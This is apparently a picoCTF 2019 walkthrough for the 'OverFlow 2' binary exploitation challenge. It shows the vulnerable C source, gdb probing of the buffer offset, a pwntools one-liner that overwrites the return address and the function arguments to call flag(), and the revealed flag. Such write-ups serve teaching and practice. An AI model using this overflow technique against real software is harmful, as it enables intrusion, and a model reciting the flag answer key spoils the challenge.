# OverFlow 2
250 points

### Description
*"Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc on the shell server. Source."*

### Solution
For this problem, I'm going to assume you know how function arguments, return address, etc., are layed out in the stack. If you aren't familiar with this, check out my walkthrough for [OverFlow 1](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%234%20-%20OverFlow%201.md). Here's the source code for the program associated with this problem:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

This problem is very similar to OverFlow 1, but this time the `flag` function has arguments. Remember, the stack for a function call looks like this:

![C generic function call stack layout.png](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/raw/C_generic_function_call_stack_layout.png)

Keep in mind, the "top" of the stack is the bottom of this picture. So, we will be able to overwrite the return address and the function arguments. We're going to use a trick with gdb to quickly figure out how many characters we need in order to overwrite the return address. We know we'll need at least 176 characters, since that's the size of `buf`. From there, we can just add characters in increments of 4 until we start overwriting the return address. I've spaced out these different attempts to make it more readable.
```bash
$ gdb vuln
(gdb) run <<< $(python -c "print('a'*(176+4))")
Starting program: /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln <<< $(python -c "print('a'*(176+4))")
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[Inferior 1 (process 229061) exited normally]


(gdb) run <<< $(python -c "print('a'*(176+8))")
Starting program: /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln <<< $(python -c "print('a'*(176+8))")
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x0804872a in main ()


(gdb) run <<< $(python -c "print('a'*(176+12))")
Starting program: /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln <<< $(python -c "print('a'*(176+12))")
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGILL, Illegal instruction.
0x08048700 in main ()


(gdb) run <<< $(python -c "print('a'*(176+16))")
Starting program: /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln <<< $(python -c "print('a'*(176+16))")
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

There we go. We started overwriting the return address exactly after the 12th extra character. So, we need 12 characters between `buf` and the return address. Let's get that return address:
```bash
(gdb) x flag
0x80485e6 <flag>:       0x53e58955
```

When `flag` is called, the process will expect a return address to be on the top of the stack, above (or below, depending how you look at it) the parameters for `flag`. Since this return won't be used until after the flag is printed out, we can just fill it with bogus characters.

Finally we have to put our parameters. We will use the `p32` function from [pwntools](http://docs.pwntools.com/en/latest/) to convert the parameters and the return address to the little-endian format that we need.
```
$ python -c "from pwn import *; print('a'*(176+12) + p32(0x080485e6) + 'aaaa' + p32(0xDEADBEEF) + p32(0xC0DED00D))" | ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaaaaaaaaaaaaa�aaaaﾭ�
```

This will give you the flag!

<details>
  <summary>Flag:</summary>
  picoCTF{arg5_and_r3turn5e919413c}
</details>

[Next Problem](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%237%20-%20NewOverFlow-1.md)

[Return to Binary Exploitation](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%230%20-%20Binary%20Exploitation%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
